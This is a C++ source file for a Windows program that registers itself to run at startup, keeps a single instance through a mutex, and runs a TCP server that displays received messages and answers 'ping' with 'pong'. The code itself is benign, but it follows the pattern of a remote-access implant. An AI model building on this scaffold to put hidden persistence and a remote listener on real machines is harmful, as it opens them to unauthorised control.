#include "Main.h"

#include "Utils.h"

// Link with ws2_32.lib
#pragma comment(lib, "Ws2_32.lib")


constexpr char ERROR_MSG[] = "Unknown Command";
constexpr char PING_COMMAND[] = "ping";
constexpr char PONG_COMMAND[] = "pong";

constexpr DWORD SLEEP_TIME = 1 * 1000 * 60 * 60;


WinapiException::WinapiException(const char* lastFunc, WinapiErrornoMethod error) : m_lastFunc(lastFunc) {
    switch (error) {
    case WinapiErrornoMethod::standardError:
        m_errorno = GetLastError();
        break;
    case WinapiErrornoMethod::wsaError:
        m_errorno = WSAGetLastError();
        break;
    default:
        m_errorno = 0;
        break;
    }
}

WinapiException::WinapiException(const char* lastFunc, int errorno) : m_lastFunc(lastFunc), m_errorno(errorno) {
    // blank
}


int WinapiException::getErrorno() {
    return m_errorno;
}

const char* WinapiException::getLastFunc() {
    return m_lastFunc;
}




void handleClient(ClientSocket& client) {
    BOOL client_connected = TRUE;
    while (client_connected) {
        try {
            std::string msg = client.recvMsg();
            openMessageBox(msg.c_str());
            if (msg ==PING_COMMAND)
                client.sendMsg(PONG_COMMAND);
            else{
                throw ClientException::invalidMsg;
            }
        }
        catch (ClientException e) {
            switch (e) {
            case ClientException::invalidMsg:
                client.sendMsg(ERROR_MSG);
                break;
            case ClientException::ClientDisconnected:
                client_connected = FALSE;
                break;
            default:
                break;
            }
        }
    }
}

void startServer() {

    ServerSocket serverSock;
    serverSock.bind();
    serverSock.listen();
    while (TRUE) {
        ClientSocket client = serverSock.accept();
        handleClient(client);
    }
}

int main() {
    try {
        Mutex mutex = ensureOneProgram();
        runOnStartUp();
        //openMessageBox();
        startServer();
    } catch (WinapiException& e) {
        std::cout << "error number " << e.getErrorno() << " in "
                  << e.getLastFunc() << "\n";
    } catch (const std::exception& e) {
        std::cout << "Unknown exception: " << e.what() << "\n";
    } catch (...) {
        std::cout << "Unknown exception\n";
    }

    WSACleanup();
}

